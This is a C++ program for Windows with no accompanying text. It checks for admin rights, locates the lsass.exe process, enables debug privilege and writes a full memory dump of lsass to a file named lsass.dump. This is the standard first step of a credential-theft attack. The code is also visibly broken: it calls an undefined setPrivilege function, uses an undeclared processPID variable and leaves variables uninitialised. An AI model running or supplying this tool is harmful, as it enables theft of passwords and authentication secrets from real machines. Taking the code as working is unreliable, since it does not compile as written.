#include <iostream>
#include "windows.h"
#include <tlhelp32.h>
using namespace std;

bool isElevatedProcess()
{
    bool isElevated;
    HANDLE access_token;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &access_token)) {
        TOKEN_ELEVATION elevation;
        DWORD token_check = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(access_token, TokenElevation, &elevation, sizeof(elevation), &token_check)) {
            isElevated = elevation.TokenIsElevated;
        }
    }
    if (access_token) {
        CloseHandle(access_token);
    }
    return isElevated;
}
DWORD GetPIDByName(const wstring& processName)
{
    DWORD processID;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 processEntry = {};
        processEntry.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(snapshot, &processEntry)) {
            do {
                wstring currentProcessName(processEntry.szExeFile);
                if (currentProcessName == processName) {
                    processID = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, &processEntry));
        }
        CloseHandle(snapshot);
    }
    return processID;
}

int main()
{
    if (isElevatedProcess())
        cout << "I have admin power!!!\n";
    else {
        cout << "I am normal user :((( \n";
        return 0;
    }
    wstring processName = L"lsass.exe";
    DWORD processID = GetPIDByName(processName);
    cout << "lsass process PID is " << processID << '\n';
    if (setPrivilege()) {
        printf("seDebugPrivilege is enabled\n");
    }
    else {
        printf("seDebugPrivilege is not enabled\n");
        return 0;
    }
    string fileName = "lsass.dump";
    wstring stemp = wstring(fileName.begin(), fileName.end());
    LPCWSTR fileName_pointer = stemp.c_str();
    HANDLE output = CreateFile(fileName_pointer, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD accessAllow = PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;
    HANDLE processHandler = OpenProcess(accessAllow, 0, processPID);

    if (processHandler && processHandler != INVALID_HANDLE_VALUE) {
        bool isDump = MiniDumpWriteDump(processHandler,processPID,output, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
        if (isDump) {
            printf("[+] lsass is dumped\n");
        }
        else {
            printf("[-] lsass is not dumped\n");
        }
    }

    cin.get();
}
